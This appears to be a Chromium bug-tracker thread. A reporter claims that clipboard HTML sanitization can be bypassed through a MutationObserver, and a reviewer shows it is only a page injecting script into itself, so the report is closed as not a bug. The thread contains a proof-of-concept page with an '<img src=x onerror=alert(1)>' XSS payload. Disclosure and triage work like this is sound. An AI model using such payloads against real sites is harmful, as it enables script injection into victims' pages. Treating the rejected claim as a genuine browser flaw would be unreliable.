@@ -1,0 +1,153 @@
+Issue ID: 397562596
+
+Author: we...@gmail.com
+<p><strong>Description</strong></p>
+<p>This vulnerability allows bypassing the markup sanitization mechanism using a combination of the Clipboard API and Mutation Observer. The fix in <a href="https://chromium-review.googlesource.com/c/chromium/src/+/3611826/4/third_party/blink/renderer/core/editing/serializers/serialization.cc#906" data-b-widget="url" data-b-original-href="https://chromium-review.googlesource.com/c/chromium/src/+/3611826/4/third_party/blink/renderer/core/editing/serializers/serialization.cc#906" data-b-redirected-href="https://www.google.com/url?q=https://chromium-review.googlesource.com/c/chromium/src/%2B/3611826/4/third_party/blink/renderer/core/editing/serializers/serialization.cc%23906&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2hSJWIhuAagjdwfVWNdAX9">https://chromium-review.googlesource.com/c/chromium/src/+/3611826/4/third_party/blink/renderer/core/editing/serializers/serialization.cc#906</a> only performs sanitization during the initial parsing stage but does not protect elements once they are inserted into the DOM, making exploitation possible through runtime manipulation.</p>
+<p>Version: 133.0.6943.127 (Official Build) (64-bit)</p>
+<p>OS: window</p>
+<p><strong>Vulnerability Details</strong></p>
+<p>I read the fix code of the vulnerability that was fixed <a href="https://issues.chromium.org/40059358" data-b-widget="issue-reference" data-b-issue-id="40059358">https://issues.chromium.org/40059358</a></p>
+<p>In this code <a href="https://chromium-review.googlesource.com/c/chromium/src/+/3611826/4/third_party/blink/renderer/core/editing/serializers/serialization.cc#906" data-b-widget="url" data-b-original-href="https://chromium-review.googlesource.com/c/chromium/src/+/3611826/4/third_party/blink/renderer/core/editing/serializers/serialization.cc#906" data-b-redirected-href="https://www.google.com/url?q=https://chromium-review.googlesource.com/c/chromium/src/%2B/3611826/4/third_party/blink/renderer/core/editing/serializers/serialization.cc%23906&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2hSJWIhuAagjdwfVWNdAX9">https://chromium-review.googlesource.com/c/chromium/src/+/3611826/4/third_party/blink/renderer/core/editing/serializers/serialization.cc#906</a>, sanitization is performed only during the initial stage but does not monitor or lock elements after they are inserted into the DOM. The <code>body-&gt;appendChild(fragment)</code> function allows subsequent markup modifications. A Mutation Observer can inject a payload after sanitization is complete, enabling Cross-Site Scripting (XSS).</p>
+<p>Only the payload <code>&lt;img src=x onerror=alert(1)&gt;</code> is successfully injected and executed.</p>
+<p>The payloads <code>&lt;svg onload=alert()&gt;</code> and <code>&lt;script&gt;alert()&lt;/script&gt;</code> will not execute in Chrome.</p>
+<p>This vulnerability only affects Chromium-based browsers. In Firefox, the exploit does not execute at all.</p>
+<p><strong>Steps to Reproduce</strong></p>
+<ol>
+<li>save the code poc.html</li>
+</ol>
+<pre><code>&lt;p&gt;&lt;button id=&quot;b1&quot;&gt;Step 1: Copy Payload&lt;/button&gt;&lt;/p&gt;
+&lt;p&gt;&lt;button id=&quot;b2&quot;&gt;Step 2: Paste &amp; Trigger&lt;/button&gt;&lt;/p&gt;
+&lt;div id=&quot;output&quot;&gt;&lt;/div&gt;
+
+&lt;script&gt;
+  const output = document.getElementById(&#39;output&#39;);
+
+  const observer = new MutationObserver(mutations =&gt; {
+    mutations.forEach(mutation =&gt; {
+      if (mutation.addedNodes.length) {
+        mutation.addedNodes.forEach(node =&gt; {
+          if (node.innerHTML) {
+            node.innerHTML += `&lt;img src=x onerror=alert(1)&gt;`;
+          }
+        });
+      }
+    });
+  });
+
+  observer.observe(output, { childList: true, subtree: true });
+
+  b1.onclick = async () =&gt; {
+    const blob = new Blob(
+      [&#39;&lt;math&gt;&lt;mtext&gt;&lt;/math&gt;&#39;],
+      { type: &quot;text/html&quot; }
+    );
+    const item = new ClipboardItem({ &quot;text/html&quot;: blob });
+    await navigator.clipboard.write([item]);
+    alert(&quot;Payload copied to clipboard!&quot;);
+  };
+
+  b2.onclick = async () =&gt; {
+    const items = await navigator.clipboard.read();
+    const htmlBlob = await items[0].getType(&quot;text/html&quot;);
+    const html = await htmlBlob.text();
+
+    output.innerHTML = html; 
+  };
+&lt;/script&gt;
+</code></pre>
+<ol start="2">
+<li>click buttton <code>copy payload</code></li>
+<li>click button <code>copy paste &amp; trigger</code></li>
+<li>detail check my video</li>
+</ol>
+<p><strong>Recommended Fixes</strong></p>
+<ul>
+<li>Disable MutationObserver on sanitized elements.</li>
+<li>Use Trusted Types to restrict innerHTML.</li>
+<li>Re-sanitize elements whenever they are modified in the DOM</li>
+</ul>
+<p><strong>NOTE</strong>
+This only occurs in Chromium-based browsers and does not work in Firefox.</p>
+
+Author: we...@gmail.com
+public_non_google
+
+Author: we...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
+
+Author: we...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: pe...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: pe...@google.com
+google_domain
+
+Author: mp...@google.com
+<p>Can you clarify what the danger of this attack is?</p>
+<p>The attack in issues.chromium.org/issues/40059358 is:</p>
+<ol>
+<li>Attacker writes dangerous html to the clipboard</li>
+<li>A victim website reads from the clipboard and assigns the data to an innerHTML, which should be safe because clipboard HTML is supposed to be sanitized</li>
+<li>The dangerous HTML bypasses the sanitization and so the innerHTML contains the attacker&#39;s payload</li>
+</ol>
+<p>But it looks like the attack you&#39;re proposing here is something like:</p>
+<ol>
+<li>Attacker writes dangerous HTML to the clipboard</li>
+<li>A victim website reads from the clipboard, sets up a mutation observer for the innerHTML, and then assigns the data to the innerHTML, which should be safe because clipboard HTML is sanitized</li>
+<li>The mutation observer from the website inserts JS into the innerHTML</li>
+</ol>
+<p>But the mutation observer is added by the victim website itself. As far as I can tell, this is just the website XSSing itself, which is not a security bug. Am I misunderstanding this attack?</p>
+
+Author: mp...@google.com
+googlers_unrestricted
+
+Author: mp...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: mp...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: we...@gmail.com
+<p>just like this report <a href="https://issues.chromium.org/40059358" data-b-widget="issue-reference" data-b-issue-id="40059358">https://issues.chromium.org/40059358</a>, Although this exploit requires some specific code on the webpage itself, I believe this scenario is highly likely to occur in real-world environments because the returned HTML is advertised as &quot;sanitized,&quot; yet it can still be manipulated after the sanitization process. and this only happens on chromium. on firefox and safari it doesn&#39;t work at all <a href="https://issues.chromium.org/issues/397562596#comment2" data-b-widget="issue-reference" data-b-issue-id="397562596" data-b-comment-number="2">comment #2</a></p>
+
+Author: pe...@google.com
+<p>Thank you for providing more feedback. Adding the requester to the CC list.</p>
+
+Author: mp...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: pe...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: mp...@google.com
+<p>Re #3, it can be manipulated by the website itself. The website would be injecting code into itself, which is just regular website operation--can you point out where the website is injecting dangerous attacker-controlled code into its own web page?</p>
+
+Author: we...@gmail.com
+<p>After exploring further. Yes, I think this is self. But this only happens in chromium. Sorry I was too hasty to report this. <a href="https://issues.chromium.org/issues/397562596#comment5" data-b-widget="issue-reference" data-b-issue-id="397562596" data-b-comment-number="5">comment #5</a></p>
+
+Author: mp...@google.com
+<p>No worries, interesting train of thought. Closing as WAI</p>
+
+Author: mp...@google.com
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: pe...@google.com
+<p>The NextAction date has arrived: 2025-02-20
+To opt-out from this automation rule, please add Optout-Blintz-Nextaction-Alert to the &quot;Chromium Labels&quot; custom field.</p>
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+google_domain
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
